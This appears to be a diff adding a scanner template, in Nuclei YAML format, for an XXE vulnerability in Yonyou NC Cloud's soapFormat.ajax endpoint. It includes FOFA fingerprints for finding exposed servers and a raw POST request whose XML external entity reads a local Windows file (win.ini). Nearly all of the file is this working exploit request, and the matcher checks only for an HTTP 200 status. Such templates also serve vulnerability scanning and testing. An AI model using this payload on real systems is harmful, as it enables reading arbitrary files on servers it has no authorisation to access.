@@ -1,0 +1,57 @@
+id: poc-hev9fg0lgistnk3m
+info:
+  name: 用友NC Cloud soapFormat.ajax接口XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hev9fg0lgistnk3m'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hev9fg0lgistnk3m
+    fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+http:
+- raw:
+  - 'POST /uapws/soapFormat.ajax HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Connection: close
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
